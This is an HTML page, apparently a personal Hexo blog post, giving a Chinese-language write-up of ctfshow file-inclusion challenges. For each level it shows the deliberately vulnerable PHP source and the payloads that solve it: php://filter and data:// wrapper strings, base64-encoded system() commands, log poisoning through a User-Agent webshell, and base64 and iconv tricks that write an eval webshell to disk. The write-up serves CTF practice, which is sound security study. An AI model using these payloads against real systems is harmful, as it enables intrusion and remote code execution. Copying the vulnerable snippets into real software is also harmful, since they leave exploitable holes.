@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/blog_head.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/blog_head.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"m21in.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="文件包含web781234567&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123;    $file &#x3D; $_GET[&#x27;file&#x27;];    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;  简单的文件包含，filter伪协议一把梭">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow-文件包含">
+<meta property="og:url" content="http://m21in.github.io/ad175165.html">
+<meta property="og:site_name" content="M21in的博客">
+<meta property="og:description" content="文件包含web781234567&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123;    $file &#x3D; $_GET[&#x27;file&#x27;];    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;  简单的文件包含，filter伪协议一把梭">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://m21in.github.io/images/ctfshow/ctfshow_web80_1.png">
+<meta property="og:image" content="http://m21in.github.io/images/ctfshow/ctfshow_web81_1.png">
+<meta property="og:image" content="http://m21in.github.io/images/ctfshow/ctfshow_web87_1.png">
+<meta property="og:image" content="http://m21in.github.io/images/ctfshow/ctfshow_web88_1.png">
+<meta property="og:image" content="http://m21in.github.io/images/ctfshow/ctfshow_web88_2.png">
+<meta property="og:image" content="http://m21in.github.io/images/ctfshow/ctfshow_web116_1.png">
+<meta property="og:image" content="http://m21in.github.io/images/ctfshow/ctfshow_web116_2.png">
+<meta property="og:image" content="http://m21in.github.io/images/ctfshow/ctfshow_web116_3.png">
+<meta property="og:image" content="http://m21in.github.io/images/ctfshow/ctfshow_web116_4.png">
+<meta property="og:image" content="http://m21in.github.io/images/ctfshow/ctfshow_web116_5.png">
+<meta property="article:published_time" content="2025-12-26T12:46:21.000Z">
+<meta property="article:modified_time" content="2025-12-26T12:53:25.118Z">
+<meta property="article:author" content="M21in">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://m21in.github.io/images/ctfshow/ctfshow_web80_1.png">
+
+<link rel="canonical" href="http://m21in.github.io/ad175165.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ctfshow-文件包含 | M21in的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">M21in的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">分享和学习</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">19</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">6</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">26</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://m21in.github.io/ad175165.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/blog_head.jpg#/images/avatar.gif">
+      <meta itemprop="name" content="M21in">
+      <meta itemprop="description" content="用来记录生活和技术的地方">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M21in的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfshow-文件包含
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-12-26 20:46:21 / 修改时间：20:53:25" itemprop="dateCreated datePublished" datetime="2025-12-26T20:46:21+08:00">2025-12-26</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>简单的文件包含，filter伪协议一把梭</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p>试了一下data伪协议也可以用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain,&lt;?php cat flag.php ?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>data伪协议有个好处，能够知道flag文件的名字;靶场的能直接梭是因为flag.php是固定的flag名</p>
+<h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>把php字符串替换成???<br>这里filter协议就用不了了<br>可以用data伪协议，加密成base64，可以绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTsgPz4=</span></span><br></pre></td></tr></table></figure>
+
+<p>base64解码是<?php system("cat flag.php"); ?></p>
+<h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了php和data，伪协议都不能用，用日志包含</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/ctfshow/ctfshow_web80_1.png"><br>这里没出，环境不好，看看payload就行</p>
+<h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><p><img src="/images/ctfshow/ctfshow_web81_1.png"><br>也是日志包含，UA写马<br>UA改成POST木马，然后file包含日志<br>POST传参木马，执行命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat fl0g.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>源代码就能看到flag文件</p>
+<h2 id="web82-86"><a href="#web82-86" class="headerlink" title="web82-86"></a>web82-86</h2><p>条件竞争，跳过了</p>
+<h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先审计代码，代码里要get传参file，post传参content，还有一个urldecode函数，代码里会对file传的参进行一次url解码，网页会自动进行一次解码，所以要进行两次url编码，用filter伪协议，写入一个木马文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/write=convert.base64-encode/resource=shell.php</span></span><br></pre></td></tr></table></figure>
+
+<p>进行两次url编码变成</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br></pre></td></tr></table></figure>
+
+<p>那么现在get传参的问题解决了，现在要post传参绕过die函数<br>上网搜了一下，用base64编码可以绕过die函数<br>但是base64支持的字符只有64个，所以&lt;?php die()&gt; 里面的&lt;?()&gt; 这些特殊字符会被忽略掉，只看phpdie，并对他进行base64解码，但是base64解码的话，得要四个字节一组，所以得在后面添加两个字符，才能对他进行base64解码<br>前面是phpdie，加上任意两个字符，例如aa,bb,11 然后再加上一句话木马想写入的内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]); <span class="meta">?&gt;</span></span><br><span class="line">PD9waHAgQGV2YWwoJF9HRVRbImNtZCJdKTsgPz4=</span><br></pre></td></tr></table></figure>
+
+<p>在之前加上aa,再进行传参</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=aaPD9waHAgQGV2YWwoJF9HRVRbImNtZCJdKTsgPz4=</span><br></pre></td></tr></table></figure>
+
+<p>成功之后访问shell.php,参数cmd传参<br><img src="/images/ctfshow/ctfshow_web87_1.png"><br>查看fl0g.php,flag在源代码里</p>
+<h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以用data伪协议，执行命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/ctfshow/ctfshow_web88_1.png"><br>可以看到正常base64加密是多一个&#x3D;的，但是实际传参传&#x3D;的时候，会进入代码的黑名单里，从而报错<br>所以不要加&#x3D;，实际base64传参的结果也是正确的<br><img src="/images/ctfshow/ctfshow_web88_2.png"><br>最终paylad：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJubCBmbDBnLnBocCIpPz4</span></span><br></pre></td></tr></table></figure>
+
+<p>base64解码是 <?php system("nl fl0g.php")?><br>原base64编码有&#x3D;号，防止被黑名单过滤，要去掉&#x3D;，且不能出现+号</p>
+<h2 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h2><p>题目说是misc+lfi<br>进去一看是个视频，有点懵逼，但是他说有misc，那就把视频下载下来分析一下<br>视频里没啥特别的地方<br>正好前面安装了wsl，就在wsl里面做题目，省的开虚拟机，很方便，具体可以看 <a href="/9a0cdaca.html" title="记一次wsl安装过程,踩过的很多坑都有">这里</a><br>wsl跟Windows的目录是互通的<br><img src="/images/ctfshow/ctfshow_web116_1.png"><br>在wsl的&#x2F;mnt目录下面可以直接跳转到Windows的目录，C盘D盘这些的<br>然后就是binwalk分离看一下<br><img src="/images/ctfshow/ctfshow_web116_2.png"><br>可以看到一个png文件<br><img src="/images/ctfshow/ctfshow_web116_3.png"><br>图片里是php源代码<br><img src="/images/ctfshow/ctfshow_web116_4.png"><br>审计一下发现源码里是get方式传参file<br>过滤了一些，但是无所谓，直接传参file&#x3D;flag.php<br>禁用了ctrl+u，输入view-source就能拿到flag了<br><img src="/images/ctfshow/ctfshow_web116_5.png"></p>
+<h2 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看到file想到伪协议，过滤了base64和rot13协议，还有别的很多协议可以用<br>用iconv*协议<br>get传参</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/convert.iconv.usc-2be.usc-2le/resource=5.php</span></span><br></pre></td></tr></table></figure>
+
+<p>post传参</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contents=<span class="meta">&lt;?</span>hp pvela$(G_TE<span class="string">&#x27;[&#x27;</span>a]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>post传参的代码有些奇怪，可以在Linux里试验一下<br>经过伪协议的编码，会变成</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>能成功传入进去</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/php/" <i class="fa fa-tag"></i> php</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" <i class="fa fa-tag"></i> 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/61d76257.html" rel="prev" title="ctfshow-php特性">
+      <i class="fa fa-chevron-left"></i> ctfshow-php特性
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+    </div>
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
